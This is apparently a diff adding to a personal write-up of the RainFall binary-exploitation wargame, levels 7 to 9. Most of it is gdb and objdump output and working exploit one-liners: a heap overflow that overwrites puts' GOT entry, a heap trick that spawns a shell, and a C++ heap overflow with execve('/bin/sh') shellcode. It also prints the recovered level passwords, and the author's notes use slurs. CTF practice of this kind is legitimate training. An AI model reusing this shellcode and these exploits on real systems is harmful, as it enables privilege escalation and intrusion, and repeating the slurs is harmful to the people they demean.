@@ -734,3 +734,392 @@ goes to eax, then eax is called
 level6@RainFall:~$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
+## level7
+```
+level7@RainFall:~$ objdump -R level7 
+
+level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+```
+executable calls strcpy, so yay
+```
+0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
+0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
+```
+there's useless calls then a call to fopen and fgets
+```
+   0x080485d0 <+175>:   mov    %eax,(%esp)
+   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
+   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
+   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
+   0x080485e4 <+195>:   movl   $0x8049960,(%esp)
+   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
+```
+But fopen what file
+```
+   0x080485c2 <+161>:   mov    $0x80486e9,%edx
+   0x080485c7 <+166>:   mov    $0x80486eb,%eax
+   0x080485cc <+171>:   mov    %edx,0x4(%esp)
+   0x080485d0 <+175>:   mov    %eax,(%esp)
+   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
+(gdb) x/s 0x80486eb
+0x80486eb:       "/home/user/level8/.pass"
+```
+So it opens the .pass file I waaaant, but doesnt print it with puts, so we need to use the function m to print that shit 
+```
+(gdb) info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x0804836c  _init
+0x080483b0  printf
+0x080483b0  printf@plt
+0x080483c0  fgets
+0x080483c0  fgets@plt
+0x080483d0  time
+0x080483d0  time@plt
+0x080483e0  strcpy
+0x080483e0  strcpy@plt
+0x080483f0  malloc
+0x080483f0  malloc@plt
+0x08048400  puts
+0x08048400  puts@plt
+0x08048410  __gmon_start__
+0x08048410  __gmon_start__@plt
+0x08048420  __libc_start_main
+0x08048420  __libc_start_main@plt
+0x08048430  fopen
+0x08048430  fopen@plt
+0x08048440  _start
+0x08048470  __do_global_dtors_aux
+0x080484d0  frame_dummy
+0x080484f4  m
+0x08048521  main
+0x08048610  __libc_csu_init
+0x08048680  __libc_csu_fini
+0x08048682  __i686.get_pc_thunk.bx
+0x08048690  __do_global_ctors_aux
+0x080486bc  _fini
+```
+**0x08048400  puts**, *address of puts function*
+```
+(gdb) disas 0x08048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928
+   0x08048406 <+6>:     push   $0x28
+   0x0804840b <+11>:    jmp    0x80483a0
+End of assembler dump.
+```
+*need to modify **0x8049928** this address*
+```
+(gdb) info proc mappings
+process 3576
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
+         0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
+         0x804a000  0x806b000    0x21000        0x0 [heap]
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
+**0x804a000  0x806b000    0x21000        0x0 [heap]**, *heap addresses*
+```
+(gdb) find 0x804a000, 0x806b000, 0x41414141
+0x804a018
+warning: Unable to access target memory at 0x806941c, halting search.
+1 pattern found.
+(gdb) find 0x804a000, 0x806b000, 0x42424242
+0x804a038
+warning: Unable to access target memory at 0x806943c, halting search.
+1 pattern found.
+```
+then, offset is 20 bytes between the 2 structs
+```
+(gdb) x/50x 0x804a000
+0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
+0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
+0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
+0x804a040:      0x00000000      0x00020fc1      0xfbad240c      0x00000000
+```
+address of puts **08049928** and address of m function **0x080484f4**
+```
+level7@RainFall:~$ ./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+## level8
+in **binary ninja**
+```
+mov     eax, data_8048819  {"auth "} 
+.
+.
+mov     eax, data_804881f  {"reset"} 
+.
+.
+mov     eax, data_8048825  {"service"}
+.
+.
+mov     eax, data_804882d  {"login"}
+.
+.
+mov     dword [esp {var_b0}], data_8048833  {"/bin/sh"}
+call    system
+```
+some keywords *auth, reset, service, login*, and a call to shell using system('/bin/sh)
+
+### random
+```
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+login
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080486e7 in main ()
+```
+login command segfauts at 0x080486e7
+```
+(gdb) x/4i 0x080486e7
+=> 0x80486e7 <main+387>:        mov    eax,DWORD PTR [eax+0x20]
+   0x80486ea <main+390>:        test   eax,eax
+   0x80486ec <main+392>:        je     0x80486ff <main+411>
+   0x80486ee <main+394>:        mov    DWORD PTR [esp],0x8048833
+```
+at this address 32 bytes are added to pointer address to the auth pointer, need to write 0x20 = 32 bytes after 0x08049aac = 0x0804a008,
+
+```
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service AAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+## level9
+inside setAnnotation(char *) from N class, there's a call to **call    memcpy**
+### random shit
+```
+(gdb) info proc map 
+process 2581
+Mapped address spaces:
+0x804a000  0x806b000    0x21000        0x0 [heap]
+```
+*heap is created after call to **operator new** in this cpp bullshit*
+```
+call    operator new
+```
+ran the executable inside gdb with arg1 = "AAAA"
+```
+(gdb) x/4wx 0x804a000
+0x804a000:      0x00000000      0x00000071      0x08048848      0x41414141
+```
+*there's the buffer I guess*
+```
+(gdb) b *main + 40
+Breakpoint 3 at 0x804861c
+.
+.
+(gdb) i r 
+eax            0x804a008        134520840
+```
+*guess thats the pointer to the object returned by new*
+```
+(gdb) x/s 0x804a008
+0x804a008:       ""
+```
+*fucking empty*
+```
+(gdb) b *main + 58
+Breakpoint 4 at 0x804862e
+```
+*breakpoint after call to N method in N class*
+```
+(gdb) i r 
+eax            0x804a008        134520840
+```
+*eax still has that address, and*
+```
+(gdb) x/s 0x804a008
+0x804a008:       "H\210\004\b"
+```
+**the fuck is that**
+### weird shit
+before call to the new operator, **ecx** had the "AAAA" for some weird reason, why would ecx be used that way
+```
+mov     ecx, esp {arg_4}
+```
+googled, apparently **there is a heavy use of ecx in c++ binaries, it's used as the (this pointer)**
+#### C++ is gay
+**Calling Convention:** Class member functions are called with the usual function parameters in the stack and with ecx pointing to the class's object (this pointer), so the allocated class object (**eax**) will be passed to **ecx** and then invocation of the constructor follows
+
+**BUT**, in disassembly of this retarded shit
+```
+0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
+=> 0x0804861c <+40>:    mov    ebx,eax
+```
+the allocated object is passed to **fucking ebx**, kill me when am I ever gonna fully understand this shit
+
+then constructor N() is called
+```
+0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
+=> 0x0804861c <+40>:    mov    ebx,eax
+```
+Break before call to setAnnotation method in N class
+```
+(gdb) b *main +128
+Breakpoint 5 at 0x8048674
+```
+*eax still has heap address **0x804a008***
+```
+(gdb) x/4wx 0x804a000
+0x804a000:      0x00000000      0x00000071      0x08048848      0x00000000
+(gdb) i r 
+eax            0x804a008        134520840
+(gdb) x/x 0x804a008
+0x804a008:      0x08048848
+```
+But where the fuck is the fucking AAAA
+```
+(gdb)  x/50wx 0x804a000
+0x804a000:      0x00000000      0x00000071      0x08048848      0x00000000
+0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000
+0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0c0:      0x00000000      0x00000000
+```
+disassembling setAnnotation
+```
+(gdb) disas _ZN1N13setAnnotationEPc
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:     push   ebp
+   0x0804870f <+1>:     mov    ebp,esp
+   0x08048711 <+3>:     sub    esp,0x18
+   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
+   0x08048717 <+9>:     mov    DWORD PTR [esp],eax
+   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048722 <+20>:    add    edx,0x4
+   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
+   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
+   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:    leave  
+   0x08048739 <+43>:    ret    
+End of assembler dump.
+```
+break after method call which contains a memcpy finally the buffer is used somewhere for fuck s sake
+```
+(gdb) b *main + 136
+Breakpoint 6 at 0x804867c
+(gdb) i r
+eax            0x804a00c        134520844
+ecx            0x41414141       1094795585
+edx            0x804a00c        134520844
+ebx            0x804a078        134520952
+(gdb) x/50x 0x0804a008
+0x804a008:      0x08048848      0x41414141      0x00000000      0x00000000
+0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
+0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
+0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0c8:      0x00000000      0x00000000
+```
+*there, at **0x804a00c**, edx and eax point to that address*
+```
+void *memcpy(void *dest, const void * src, size_t n)
+```
+strlen is called then memcpy, 3 arguments are put into stack for call of memcpy
+```
+mov     dword [esp+0x8 {var_14}], eax
+mov     eax, dword [ebp+0xc {arg_8}]
+mov     dword [esp+0x4 {var_18}], eax
+mov     dword [esp {var_1c_1}], edx
+call    memcpy
+```
+size of buffer is at **esp+0x8**, then at **esp+0x4** src, and dst at esp, taken from edx which is **0x804a00c**
+```
+(gdb) x/s 0x804a00c
+0x804a00c:       "AAAA"
+```
+address of the string is 0x804a00c, and offset 108 (0x804a078 - 0x804a00c)
+```
+0x804a008:      0x08048848      0x41414141      0x00000000      0x00000000
+0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
+0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
+```
+we need to override edx to call the shellcode thats 21 bytes long, 
+```
+(gdb) run $(python -c "print 'A' * 87 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
+(gdb) x/50wx 0x0804a008
+0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a058:      0x41414141      0x41414141      0x31414141      0x51e1f7c9
+0x804a068:      0x732f2f68      0x622f6868      0xe3896e69      0x80cd0bb0
+0x804a078:      0x0804a00c      0x00000000      0x00000000      0x00000000
+0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0c8:      0x00000000      0x00000000
+```
+yay
+```
+level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
+$ cat /home/user/level10/.pass
+cat: /home/user/level10/.pass: No such file or directory
+$ cat .pass
+cat: .pass: Permission denied
+$ id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+No level10, im an idiot
